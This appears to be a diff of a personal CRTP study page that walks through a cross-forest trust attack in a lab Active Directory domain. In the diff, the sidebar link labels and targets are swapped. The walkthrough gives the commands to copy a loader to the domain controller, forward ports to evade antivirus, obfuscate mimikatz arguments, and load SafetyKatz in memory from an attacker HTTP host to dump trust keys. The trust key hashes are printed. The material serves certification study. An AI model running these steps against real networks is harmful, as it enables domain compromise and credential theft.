@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Cross-Forest Trust - CRTP</title>
+  <title>CrossForest Trust - Trust Flow - CRTP</title>
   <link rel="shortcut icon" href="../../assets/images/logo.ico" type="image/x-icon">
   <link rel="stylesheet" href="../../assets/css/style.css">
   <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -76,25 +76,25 @@
           <a href="../../" class="home-link">← Home</a>
           <a href="../../certifications/" class="home-link">← Certifications</a>
           <h3>Sections</h3>
-          <a href="enumeration.html" class="">Enumeration</a>
-          <a href="privilege-escalation.html" class="">Privilege Escalation</a>
-          <a href="privilege-escalation-domain-admin.html" class="">Privilege Escalation via Domain Admin</a>
-          <a href="golden-ticket.html" class="">Golden Ticket</a>
-          <a href="silver-ticket.html" class="">Silver Ticket</a>
-          <a href="diamond-ticket.html" class="">Diamond Ticket</a>
-          <a href="abusing-dsrm-credentials.html" class="">Abusing DSRM Credentials</a>
-          <a href="dcsync-attack.html" class="">DCSync Attack</a>
-          <a href="security-descriptor-abuse.html" class="">Security Descriptor Abuse</a>
-          <a href="asrep-roasting.html" class="">AS-REP Roasting</a>
-          <a href="unconstrained-delegation.html" class="">Unconstrained Delegation</a>
-          <a href="constrained-delegation.html" class="">Constrained Delegation</a>
-          <a href="rbcd.html" class="">RBCD</a>
-          <a href="sid-history-trust-ticket.html" class="">SID-History Trust Ticket</a>
-          <a href="sid-history-krbtgt.html" class="">SID-History KRBTGT</a>
-          <a href="cross-forest-trust.html" class="active">Cross-Forest Trust</a>
-          <a href="adcs-attacks.html" class="">ADCS Attacks</a>
-          <a href="trust-links-abuse.html" class="">Trust Links Abuse</a>
-          <a href="mde-mdi-bypass.html" class="">MDE/MDI Bypass</a>
+          <a href="Enumeration" class="">enumeration.html</a>
+          <a href="Privilege Escalation" class="">privilege-escalation.html</a>
+          <a href="Privilege Escalation via Domain Admin session" class="">privilege-escalation-domain-admin.html</a>
+          <a href="Golden Ticket" class="">golden-ticket.html</a>
+          <a href="Silver Ticket" class="">silver-ticket.html</a>
+          <a href="Diamond Ticket" class="">diamond-ticket.html</a>
+          <a href="Abusing DSRM Credentials" class="">abusing-dsrm-credentials.html</a>
+          <a href="DCSync Attack" class="">dcsync-attack.html</a>
+          <a href="Security Descriptor Abuse" class="">security-descriptor-abuse.html</a>
+          <a href="ASREP-Roasting Attack" class="">asrep-roasting.html</a>
+          <a href="Unconstrained Delegation" class="">unconstrained-delegation.html</a>
+          <a href="Constrained Delegation" class="">constrained-delegation.html</a>
+          <a href="Resource-Based Constrained Delegation (RBCD)" class="">rbcd.html</a>
+          <a href="Enterprise Admins Trust - SID-History Abuse with Trust Ticket" class="">sid-history-trust-ticket.html</a>
+          <a href="Enterprise Admin Trust - SID-History Abuse with KRBTGT hash" class="">sid-history-krbtgt.html</a>
+          <a href="CrossForest Trust - Trust Flow" class="">cross-forest-trust.html</a>
+          <a href="ADCS Attacks" class="">adcs-attacks.html</a>
+          <a href="Trust Links Abuse" class="">trust-links-abuse.html</a>
+          <a href="MDE/MDI Bypass" class="">mde-mdi-bypass.html</a>
 
         </div>
         <div class="separator"></div>
@@ -114,221 +114,133 @@
 
     <div class="main-content">
       <article class="about active" data-page="about">
-        <header class="h2 article-title">Cross-Forest Trust</header>
+        <header class="h2 article-title">CrossForest Trust - Trust Flow</header>
         <section class="about-text">
           <div class="notion-content">
-<p>let’s assume we already have Domain Admin access into dollarcorp.moneycorp.local.</p>
-<h1>Enumeration</h1>
-<p>Ok so assuming that we already have Access as Domain Admin.
-To enumerate Domain Trusts we will be using PowerView Modules.</p>
-<p><code>. .\PowerView.ps1</code></p>
-<p><code>Get-DomainTrust</code></p>
-<p>This output from the <code>Get-DomainTrust</code> command in PowerView provides detailed information about a specific domain trust. 
-Here's a breakdown of each field:</p>
-<ol>
-<li>
-<p>SourceName: The name of the source domain, which is dollarcorp.moneycorp.local in this case.</p>
-</li>
-<li>
-<p>TargetName: The name of the target domain, which is eurocorp.local in this case.</p>
-</li>
-<li>
-<p>TrustType: The type of trust established between the source and target domains. In this case, it is a WINDOWS_ACTIVE_DIRECTORY trust, which is a standard Active Directory trust.</p>
-</li>
-<li>
-<p>TrustAttributes: The attributes of the trust. In this case, the trust is set to FILTER_SIDS, which means that the SID filtering is enabled for this trust. This means that the SID of the users from the target domain will be filtered to match the SID of the users in the source domain.</p>
-</li>
-<li>
-<p>TrustDirection: The direction of the trust. In this case, the trust is Bidirectional, indicating that the trust is established in both directions, allowing users from both domains to access resources in each other's domains.</p>
-</li>
-</ol>
-<h3>Using PELoader.exe for args encoding.</h3>
-<p>Back to cmdlet, <code>PELoader.exe</code> is a tool used to load a payload into memory. So I’ll use PELoader.exe now to load and execute Rubeus.exe into memory. Pay attention that if we are using PELoader.exe to load payloads into memory only. It is also good that we execute <strong>ArgSplit.bat</strong> first to encode parameters of Rubeus, SafetyKatz and BetterSafetyKatz.</p>
-<p>Let’s start by uploading <strong>PELoader.exe</strong> into Domain-Controller.</p>
-<p><code>echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Public\Loader.exe /Y</code></p>
-<p>Now let’s remotely access the Domain-Controller and activate Portforwarding to avoid AV and other security mechanisms.</p>
-<p>Accessing Domain Controller.</p>
-<p><code>winrs -r:dcorp-dc cmd</code></p>
-<p>Portforwarding inside DC. We will use PELoader.exe to execute payloads from memory on the target machine, as it allows you to avoid directly interacting with the target's local disk. By forwarding the connection to the remote machine, you can potentially bypass certain security controls or restrictions on the target system.
-<code>netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.51</code></p>
-<p>Let's go through the different flags used in the <code>netsh interface portproxy add v4tov4</code> command:</p>
-<ol>
-<li>
-<p>v4tov4: This specifies that the port forwarding is between IPv4 addresses. You can also use v6tov6 for IPv6 or v6tov4 and v4tov6 for mixed IPv4 and IPv6 scenarios.</p>
-</li>
-<li>
-<p>listenport:8080: This is the local port on the machine where the connection will be listened for. In your case, it's port 8080.</p>
-</li>
-<li>
-<p>listenaddress:0.0.0.0: This is the local IP address that the port will be listening on. Using 0.0.0.0 means it will listen on all available IP addresses on the machine.</p>
-</li>
-<li>
-<p>connectport:80: This is the port that the incoming connection on the local machine (port 8080) will be forwarded to. In your case, it's port 80.</p>
-</li>
-<li>
-<p>connectaddress:172.16.100.51: This is the IP address that the connection will be forwarded to. In your case, it's the IP address 172.16.100.51.</p>
-</li>
-</ol>
-<p>The purpose of this port forwarding configuration is to redirect any connections made to the local machine on port 8080 to the remote machine at IP address <code>172.16.100.51</code> on port 80.</p>
-<p>Don’t forget to setup a listener in our target machine, this way the DC can access the SafetyKatz. I’ll be using HFS.exe for now but you can also use python or anything else.
-My HFS is listening on port 80.</p>
-<p>Now back to our attacking machine in cmdlet, let’s execute ArgSplit.bat to Encode our payload “<code>lsadump::trust</code>” and let’s copy/paste it into our winrs session to DC.</p>
-<p>The <code>lsadump::trust</code> command SafetyKatz.exe is used to dump the trust keys (passwords) for all associated trusts (domain/forest) when run on a Domain Controller. 
-This command is particularly useful for inter-realm trust abuse, where an attacker can use the trust keys to forge trust tickets and gain access to resources across the trust boundary.</p>
-<div class="highlight"><pre><span></span><code><span class="p">[!]</span> <span class="n">Argument</span> <span class="n">Limit</span><span class="p">:</span> <span class="n">180</span> <span class="n">characters</span>
-<span class="p">[+]</span> <span class="n">Enter</span> <span class="n">a</span> <span class="n">string</span><span class="p">:</span> <span class="n">lsadump</span><span class="p">::</span><span class="n">trust</span>
-<span class="nb">set </span><span class="s2">&quot;z=t&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;y=s&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;x=u&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;w=r&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;v=t&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;u=:&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;t=:&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;s=p&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;r=m&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;q=u&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;p=d&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;o=a&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;n=s&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;m=l&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;Pwn=%m%%n%%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%&quot;</span>
-</code></pre></div>
+<p class="" id="30c79e9a-d7c9-80fb-8835-f76cac3f6fcc">
+</p><p class="" id="30c79e9a-d7c9-80e2-b292-cac5138bbf89">
+</p><p class="" id="30c79e9a-d7c9-80b9-8659-e9b28b793e44">let’s assume we already have Domain Admin access into dollarcorp.moneycorp.local.</p><p class="" id="30c79e9a-d7c9-80d9-9b3c-d57cceaa8bb7">
+</p><h1 class="" id="30c79e9a-d7c9-8065-8225-df2eed9f4508">Enumeration</h1><p class="" id="30c79e9a-d7c9-800b-bfdf-e64f0bb73300">Ok so assuming that we already have Access as Domain Admin.<br/>To enumerate Domain Trusts we will be using PowerView Modules.</p><p class="" id="30c79e9a-d7c9-8010-9ba5-fadc7c413fd1"><code>. .\PowerView.ps1</code></p><p class="" id="30c79e9a-d7c9-8017-b953-f902dd24120a"><code>Get-DomainTrust</code></p><a href="../../assets/crtp/Untitled 131.png"><img src="../../assets/crtp/Untitled 131.png"/></a><p class="" id="30c79e9a-d7c9-80fd-be53-c0c1ccd733bf">This output from the <code>Get-DomainTrust</code> command in PowerView provides detailed information about a specific domain trust. <br/>Here's a breakdown of each field:</p><ol class="numbered-list" id="30c79e9a-d7c9-80d5-896a-ef2f862597a3" start="1" type="1"><li><strong>SourceName</strong>: The name of the source domain, which is <code>dollarcorp.moneycorp.local</code> in this case.</li></ol><ol class="numbered-list" id="30c79e9a-d7c9-8041-9895-d3571f8ceb95" start="2" type="1"><li><strong>TargetName</strong>: The name of the target domain, which is <code>eurocorp.local</code> in this case.</li></ol><ol class="numbered-list" id="30c79e9a-d7c9-8080-afe8-e12497d0a622" start="3" type="1"><li><strong>TrustType</strong>: The type of trust established between the source and target domains. In this case, it is a <code>WINDOWS_ACTIVE_DIRECTORY</code> trust, which is a standard Active Directory trust.</li></ol><ol class="numbered-list" id="30c79e9a-d7c9-80df-bdec-d7d33d6f0898" start="4" type="1"><li><strong>TrustAttributes</strong>: The attributes of the trust. In this case, the trust is set to <code>FILTER_SIDS</code>, which means that the SID filtering is enabled for this trust. This means that the SID of the users from the target domain will be filtered to match the SID of the users in the source domain.</li></ol><ol class="numbered-list" id="30c79e9a-d7c9-80c4-8a97-c38c239ce8d3" start="5" type="1"><li><strong>TrustDirection</strong>: The direction of the trust. In this case, the trust is <code>Bidirectional</code>, indicating that the trust is established in both directions, allowing users from both domains to access resources in each other's domains.</li></ol><p class="" id="30c79e9a-d7c9-8095-ba98-dfc3f1c7ae68">
+</p><h3 class="" id="30c79e9a-d7c9-8062-8cee-f765cedccdac">Using PELoader.exe for args encoding.</h3><p class="" id="30c79e9a-d7c9-8033-8283-d6757eba7641">Back to cmdlet, <code>PELoader.exe</code> is a tool used to load a payload into memory. So I’ll use PELoader.exe now to load and execute Rubeus.exe into memory. Pay attention that if we are using PELoader.exe to load payloads into memory only. It is also good that we execute <strong>ArgSplit.bat</strong> first to encode parameters of Rubeus, SafetyKatz and BetterSafetyKatz.</p><p class="" id="30c79e9a-d7c9-8046-9d95-d59d6ae1c422">
+</p><p class="" id="30c79e9a-d7c9-8095-a096-f3ab63e4bd4c">Let’s start by uploading <strong>PELoader.exe</strong> into Domain-Controller.</p><p class="" id="30c79e9a-d7c9-8032-b0ca-c931309b2399"><code>echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Public\Loader.exe /Y</code></p><a href="../../assets/crtp/Untitled 120.png"><img src="../../assets/crtp/Untitled 120.png"/></a><p class="" id="30c79e9a-d7c9-8072-9fc0-ea8ac47bb744">Now let’s remotely access the Domain-Controller and activate Portforwarding to avoid AV and other security mechanisms.</p><p class="" id="30c79e9a-d7c9-80b5-863c-d72a83e15aba">Accessing Domain Controller.</p><p class="" id="30c79e9a-d7c9-8089-8294-e0d251cb92a9"><code>winrs -r:dcorp-dc cmd</code></p><p class="" id="30c79e9a-d7c9-80b9-b66d-e5817318f747">
+</p><p class="" id="30c79e9a-d7c9-8033-b690-ed4b20557b87">Portforwarding inside DC. We will use PELoader.exe to execute payloads from memory on the target machine, as it allows you to avoid directly interacting with the target's local disk. By forwarding the connection to the remote machine, you can potentially bypass certain security controls or restrictions on the target system.<br/><code>netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.51</code></p><a href="../../assets/crtp/Untitled 121.png"><img src="../../assets/crtp/Untitled 121.png"/></a><p class="" id="30c79e9a-d7c9-8096-aa09-e2dfe642f91e">Let's go through the different flags used in the <code>netsh interface portproxy add v4tov4</code> command:</p><ol class="numbered-list" id="30c79e9a-d7c9-80f8-9429-dabb7262896a" start="1" type="1"><li><code>v4tov4</code>: This specifies that the port forwarding is between IPv4 addresses. You can also use <code>v6tov6</code> for IPv6 or <code>v6tov4</code> and <code>v4tov6</code> for mixed IPv4 and IPv6 scenarios.</li></ol><ol class="numbered-list" id="30c79e9a-d7c9-80b3-9c4a-ed1f8e486210" start="2" type="1"><li><code>listenport:8080</code>: This is the local port on the machine where the connection will be listened for. In your case, it's port 8080.</li></ol><ol class="numbered-list" id="30c79e9a-d7c9-80c0-910b-c4bd01ae7ab1" start="3" type="1"><li><code>listenaddress:0.0.0.0</code>: This is the local IP address that the port will be listening on. Using <code>0.0.0.0</code> means it will listen on all available IP addresses on the machine.</li></ol><ol class="numbered-list" id="30c79e9a-d7c9-8006-b0d4-fb1743a34545" start="4" type="1"><li><code>connectport:80</code>: This is the port that the incoming connection on the local machine (port 8080) will be forwarded to. In your case, it's port 80.</li></ol><ol class="numbered-list" id="30c79e9a-d7c9-80d2-9add-ec606604938a" start="5" type="1"><li><code>connectaddress:172.16.100.51</code>: This is the IP address that the connection will be forwarded to. In your case, it's the IP address <code>172.16.100.51</code>.</li></ol><p class="" id="30c79e9a-d7c9-80ef-9046-fd8404d6981e">The purpose of this port forwarding configuration is to redirect any connections made to the local machine on port 8080 to the remote machine at IP address <code>172.16.100.51</code> on port 80.</p><p class="" id="30c79e9a-d7c9-80d0-9d66-e9fd9114f0cd">
+</p><p class="" id="30c79e9a-d7c9-8056-a09a-d8583391a755">Don’t forget to setup a listener in our target machine, this way the DC can access the SafetyKatz. I’ll be using HFS.exe for now but you can also use python or anything else.<br/>My HFS is listening on port 80.</p><a href="../../assets/crtp/Untitled 122.png"><img src="../../assets/crtp/Untitled 122.png"/></a><p class="" id="30c79e9a-d7c9-8003-96c3-c5a401db9ba7">
+</p><p class="" id="30c79e9a-d7c9-80dd-a62b-db1b2539a27b">Now back to our attacking machine in cmdlet, let’s execute ArgSplit.bat to Encode our payload “<code><strong>lsadump::trust</strong></code>” and let’s copy/paste it into our winrs session to DC.</p><p class="" id="30c79e9a-d7c9-80dd-b9c5-cb1429f92c2f">The <code>lsadump::trust</code> command SafetyKatz.exe is used to dump the trust keys (passwords) for all associated trusts (domain/forest) when run on a Domain Controller. <br/>This command is particularly useful for inter-realm trust abuse, where an attacker can use the trust keys to forge trust tickets and gain access to resources across the trust boundary.</p><link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" referrerpolicy="no-referrer" rel="stylesheet"/><pre class="code code-wrap" id="30c79e9a-d7c9-80d5-b8f9-e58f4b15e9b2"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">[!] Argument Limit: 180 characters
+[+] Enter a string: lsadump::trust
+set "z=t"
+set "y=s"
+set "x=u"
+set "w=r"
+set "v=t"
+set "u=:"
+set "t=:"
+set "s=p"
+set "r=m"
+set "q=u"
+set "p=d"
+set "o=a"
+set "n=s"
+set "m=l"
+set "Pwn=%m%%n%%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%"</code></pre><a href="../../assets/crtp/Untitled 123.png"><img src="../../assets/crtp/Untitled 123.png"/></a><p class="" id="30c79e9a-d7c9-80f4-b76a-c642ffa026e4">
+</p><p class="" id="30c79e9a-d7c9-8015-aeec-db3eceed2da4">After encoding the paylod word, we can get all the trust keys we have inside Domain Controller.</p><p class="" id="30c79e9a-d7c9-808e-b9a0-ea2eb906f628"><code>C:\Users\Public\Loader.exe -path </code><code><a href="http://127.0.0.1:8080/SafetyKatz.exe">http://127.0.0.1:8080/SafetyKatz.exe</a></code><code> -args "%Pwn% /patch" "exit"</code></p><link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" referrerpolicy="no-referrer" rel="stylesheet"/><pre class="code code-wrap" id="30c79e9a-d7c9-80ab-a90b-d11a05b48b2b"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">mimikatz(commandline) # lsadump::trust /patch
 
-<p>After encoding the paylod word, we can get all the trust keys we have inside Domain Controller.</p>
-<p><code>C:\Users\Public\Loader.exe -path ``http://127.0.0.1:8080/SafetyKatz.exe`` -args "%Pwn% /patch" "exit"</code></p>
-<div class="highlight"><pre><span></span><code><span class="n">mimikatz</span><span class="p">(</span><span class="n">commandline</span><span class="p">)</span> <span class="c"># lsadump::trust /patch</span>
+Current domain: DOLLARCORP.MONEYCORP.LOCAL (dcorp / S-1-5-21-719815819-3726368948-3917688648)
 
-<span class="n">Current</span> <span class="n">domain</span><span class="p">:</span> <span class="n">DOLLARCORP</span><span class="p">.</span><span class="n">MONEYCORP</span><span class="p">.</span><span class="n">LOCAL</span> <span class="p">(</span><span class="n">dcorp</span> <span class="p">/</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">719815819</span><span class="p">-</span><span class="n">3726368948</span><span class="p">-</span><span class="n">3917688648</span><span class="p">)</span>
+Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-335606122-960912869-3279953914)
+ [  In ] DOLLARCORP.MONEYCORP.LOCAL -&gt; MONEYCORP.LOCAL
+    * 6/4/2024 6:22:58 AM - CLEAR   - 62 d7 c6 a5 15 fb 76 34 f5 00 4e 99 19 de 5d ae 04 e4 42 b1 e8 a5 55 0b 0b 39 54 eb
+        * aes256_hmac       7f5975749f090a5dfca11c129cda9abf0214e7a2b9c4a566f2797d97266e2e4d
+        * aes128_hmac       80ed08fa8e8ef13c37fa06c41787fd5f
+        * rc4_hmac_nt       11584b767b6316e5f48b35e029c32ade
 
-<span class="n">Domain</span><span class="p">:</span> <span class="n">MONEYCORP</span><span class="p">.</span><span class="n">LOCAL</span> <span class="p">(</span><span class="n">mcorp</span> <span class="p">/</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">)</span>
- <span class="p">[</span>  <span class="k">In</span> <span class="p">]</span> <span class="n">DOLLARCORP</span><span class="p">.</span><span class="n">MONEYCORP</span><span class="p">.</span><span class="n">LOCAL</span> <span class="p">-&gt;</span> <span class="n">MONEYCORP</span><span class="p">.</span><span class="n">LOCAL</span>
-    <span class="p">*</span> <span class="n">6</span><span class="p">/</span><span class="n">4</span><span class="p">/</span><span class="n">2024</span> <span class="n">6</span><span class="p">:</span><span class="n">22</span><span class="p">:</span><span class="n">58</span> <span class="n">AM</span> <span class="p">-</span> <span class="nb">CLEAR </span>  <span class="p">-</span> <span class="n">62</span> <span class="n">d7</span> <span class="n">c6</span> <span class="n">a5</span> <span class="n">15</span> <span class="n">fb</span> <span class="n">76</span> <span class="n">34</span> <span class="n">f5</span> <span class="n">00</span> <span class="n">4e</span> <span class="n">99</span> <span class="n">19</span> <span class="n">de</span> <span class="n">5d</span> <span class="n">ae</span> <span class="n">04</span> <span class="n">e4</span> <span class="n">42</span> <span class="n">b1</span> <span class="n">e8</span> <span class="n">a5</span> <span class="n">55</span> <span class="n">0b</span> <span class="n">0b</span> <span class="n">39</span> <span class="n">54</span> <span class="n">eb</span>
-        <span class="p">*</span> <span class="n">aes256_hmac</span>       <span class="n">7f5975749f090a5dfca11c129cda9abf0214e7a2b9c4a566f2797d97266e2e4d</span>
-        <span class="p">*</span> <span class="n">aes128_hmac</span>       <span class="n">80ed08fa8e8ef13c37fa06c41787fd5f</span>
-        <span class="p">*</span> <span class="n">rc4_hmac_nt</span>       <span class="n">11584b767b6316e5f48b35e029c32ade</span>
+ [ Out ] MONEYCORP.LOCAL -&gt; DOLLARCORP.MONEYCORP.LOCAL
+    * 6/4/2024 6:22:58 AM - CLEAR   - 62 d7 c6 a5 15 fb 76 34 f5 00 4e 99 19 de 5d ae 04 e4 42 b1 e8 a5 55 0b 0b 39 54 eb
+        * aes256_hmac       00b89c3a1249a3aa4180baee10e33e183ea4916315d8c71e12c5f6285c46cad0
+        * aes128_hmac       3ae361f350844d9132dc55d4daaa1c49
+        * rc4_hmac_nt       11584b767b6316e5f48b35e029c32ade
 
- <span class="p">[</span> <span class="n">Out</span> <span class="p">]</span> <span class="n">MONEYCORP</span><span class="p">.</span><span class="n">LOCAL</span> <span class="p">-&gt;</span> <span class="n">DOLLARCORP</span><span class="p">.</span><span class="n">MONEYCORP</span><span class="p">.</span><span class="n">LOCAL</span>
-    <span class="p">*</span> <span class="n">6</span><span class="p">/</span><span class="n">4</span><span class="p">/</span><span class="n">2024</span> <span class="n">6</span><span class="p">:</span><span class="n">22</span><span class="p">:</span><span class="n">58</span> <span class="n">AM</span> <span class="p">-</span> <span class="nb">CLEAR </span>  <span class="p">-</span> <span class="n">62</span> <span class="n">d7</span> <span class="n">c6</span> <span class="n">a5</span> <span class="n">15</span> <span class="n">fb</span> <span class="n">76</span> <span class="n">34</span> <span class="n">f5</span> <span class="n">00</span> <span class="n">4e</span> <span class="n">99</span> <span class="n">19</span> <span class="n">de</span> <span class="n">5d</span> <span class="n">ae</span> <span class="n">04</span> <span class="n">e4</span> <span class="n">42</span> <span class="n">b1</span> <span class="n">e8</span> <span class="n">a5</span> <span class="n">55</span> <span class="n">0b</span> <span class="n">0b</span> <span class="n">39</span> <span class="n">54</span> <span class="n">eb</span>
-        <span class="p">*</span> <span class="n">aes256_hmac</span>       <span class="n">00b89c3a1249a3aa4180baee10e33e183ea4916315d8c71e12c5f6285c46cad0</span>
-        <span class="p">*</span> <span class="n">aes128_hmac</span>       <span class="n">3ae361f350844d9132dc55d4daaa1c49</span>
-        <span class="p">*</span> <span class="n">rc4_hmac_nt</span>       <span class="n">11584b767b6316e5f48b35e029c32ade</span>
+ [ In-1] DOLLARCORP.MONEYCORP.LOCAL -&gt; MONEYCORP.LOCAL
+    * 6/4/2024 6:22:56 AM - CLEAR   - 5b 9c 88 2c 73 e6 10 fb 65 79 6f 48 aa 44 d1 18 89 7a 87 f4 97 99 91 c5 ab 98 a7 11
+        * aes256_hmac       0c024bac1d35a41c856cb9dca37ba1833778182f2e90809b2c79f94609af1d84
+        * aes128_hmac       c4edc8a09c8b13b9ed02999f38638706
+        * rc4_hmac_nt       e3403939117948bfb16731f16c41c261
 
- <span class="p">[</span> <span class="k">In</span><span class="p">-</span><span class="n">1</span><span class="p">]</span> <span class="n">DOLLARCORP</span><span class="p">.</span><span class="n">MONEYCORP</span><span class="p">.</span><span class="n">LOCAL</span> <span class="p">-&gt;</span> <span class="n">MONEYCORP</span><span class="p">.</span><span class="n">LOCAL</span>
-    <span class="p">*</span> <span class="n">6</span><span class="p">/</span><span class="n">4</span><span class="p">/</span><span class="n">2024</span> <span class="n">6</span><span class="p">:</span><span class="n">22</span><span class="p">:</span><span class="n">56</span> <span class="n">AM</span> <span class="p">-</span> <span class="nb">CLEAR </span>  <span class="p">-</span> <span class="n">5b</span> <span class="n">9c</span> <span class="n">88</span> <span class="n">2c</span> <span class="n">73</span> <span class="n">e6</span> <span class="n">10</span> <span class="n">fb</span> <span class="n">65</span> <span class="n">79</span> <span class="n">6f</span> <span class="n">48</span> <span class="n">aa</span> <span class="n">44</span> <span class="n">d1</span> <span class="n">18</span> <span class="n">89</span> <span class="n">7a</span> <span class="n">87</span> <span class="n">f4</span> <span class="n">97</span> <span class="n">99</span> <span class="n">91</span> <span class="n">c5</span> <span class="n">ab</span> <span class="n">98</span> <span class="n">a7</span> <span class="n">11</span>
-        <span class="p">*</span> <span class="n">aes256_hmac</span>       <span class="n">0c024bac1d35a41c856cb9dca37ba1833778182f2e90809b2c79f94609af1d84</span>
-        <span class="p">*</span> <span class="n">aes128_hmac</span>       <span class="n">c4edc8a09c8b13b9ed02999f38638706</span>
-        <span class="p">*</span> <span class="n">rc4_hmac_nt</span>       <span class="n">e3403939117948bfb16731f16c41c261</span>
+ [Out-1] MONEYCORP.LOCAL -&gt; DOLLARCORP.MONEYCORP.LOCAL
+    * 6/4/2024 6:22:56 AM - CLEAR   - 5b 9c 88 2c 73 e6 10 fb 65 79 6f 48 aa 44 d1 18 89 7a 87 f4 97 99 91 c5 ab 98 a7 11
+        * aes256_hmac       b46bb7200992cbb5463c5206936cb7ddf6f93bf1f3618340a64c30fbdefd2bad
+        * aes128_hmac       f8103415a54c0e7e10ab7452e892fe05
+        * rc4_hmac_nt       e3403939117948bfb16731f16c41c261
 
- <span class="p">[</span><span class="n">Out</span><span class="p">-</span><span class="n">1</span><span class="p">]</span> <span class="n">MONEYCORP</span><span class="p">.</span><span class="n">LOCAL</span> <span class="p">-&gt;</span> <span class="n">DOLLARCORP</span><span class="p">.</span><span class="n">MONEYCORP</span><span class="p">.</span><span class="n">LOCAL</span>
-    <span class="p">*</span> <span class="n">6</span><span class="p">/</span><span class="n">4</span><span class="p">/</span><span class="n">2024</span> <span class="n">6</span><span class="p">:</span><span class="n">22</span><span class="p">:</span><span class="n">56</span> <span class="n">AM</span> <span class="p">-</span> <span class="nb">CLEAR </span>  <span class="p">-</span> <span class="n">5b</span> <span class="n">9c</span> <span class="n">88</span> <span class="n">2c</span> <span class="n">73</span> <span class="n">e6</span> <span class="n">10</span> <span class="n">fb</span> <span class="n">65</span> <span class="n">79</span> <span class="n">6f</span> <span class="n">48</span> <span class="n">aa</span> <span class="n">44</span> <span class="n">d1</span> <span class="n">18</span> <span class="n">89</span> <span class="n">7a</span> <span class="n">87</span> <span class="n">f4</span> <span class="n">97</span> <span class="n">99</span> <span class="n">91</span> <span class="n">c5</span> <span class="n">ab</span> <span class="n">98</span> <span class="n">a7</span> <span class="n">11</span>
-        <span class="p">*</span> <span class="n">aes256_hmac</span>       <span class="n">b46bb7200992cbb5463c5206936cb7ddf6f93bf1f3618340a64c30fbdefd2bad</span>
-        <span class="p">*</span> <span class="n">aes128_hmac</span>       <span class="n">f8103415a54c0e7e10ab7452e892fe05</span>
-        <span class="p">*</span> <span class="n">rc4_hmac_nt</span>       <span class="n">e3403939117948bfb16731f16c41c261</span>
 
-<span class="n">Domain</span><span class="p">:</span> <span class="n">US</span><span class="p">.</span><span class="n">DOLLARCORP</span><span class="p">.</span><span class="n">MONEYCORP</span><span class="p">.</span><span class="n">LOCAL</span> <span class="p">(</span><span class="n">US</span> <span class="p">/</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">1028785420</span><span class="p">-</span><span class="n">4100948154</span><span class="p">-</span><span class="n">1806204659</span><span class="p">)</span>
- <span class="p">[</span>  <span class="k">In</span> <span class="p">]</span> <span class="n">DOLLARCORP</span><span class="p">.</span><span class="n">MONEYCORP</span><span class="p">.</span><span class="n">LOCAL</span> <span class="p">-&gt;</span> <span class="n">US</span><span class="p">.</span><span class="n">DOLLARCORP</span><span class="p">.</span><span class="n">MONEYCORP</span><span class="p">.</span><span class="n">LOCAL</span>
-    <span class="p">*</span> <span class="n">6</span><span class="p">/</span><span class="n">4</span><span class="p">/</span><span class="n">2024</span> <span class="n">6</span><span class="p">:</span><span class="n">23</span><span class="p">:</span><span class="n">05</span> <span class="n">AM</span> <span class="p">-</span> <span class="nb">CLEAR </span>  <span class="p">-</span> <span class="n">97</span> <span class="n">f8</span> <span class="n">65</span> <span class="n">53</span> <span class="n">4a</span> <span class="n">83</span> <span class="n">9e</span> <span class="n">27</span> <span class="n">46</span> <span class="n">ce</span> <span class="n">48</span> <span class="n">dd</span> <span class="n">b2</span> <span class="n">e1</span> <span class="n">b8</span> <span class="n">c9</span> <span class="n">ee</span> <span class="n">bd</span> <span class="n">76</span> <span class="n">ba</span> <span class="n">6b</span> <span class="n">5e</span> <span class="n">68</span> <span class="n">51</span> <span class="n">3a</span> <span class="n">ab</span> <span class="n">16</span> <span class="n">3f</span>
-        <span class="p">*</span> <span class="n">aes256_hmac</span>       <span class="n">d594bdbdf43f709b7c17755c51723d982d6ced1d2929fbd3ea9edab82b35d4c1</span>
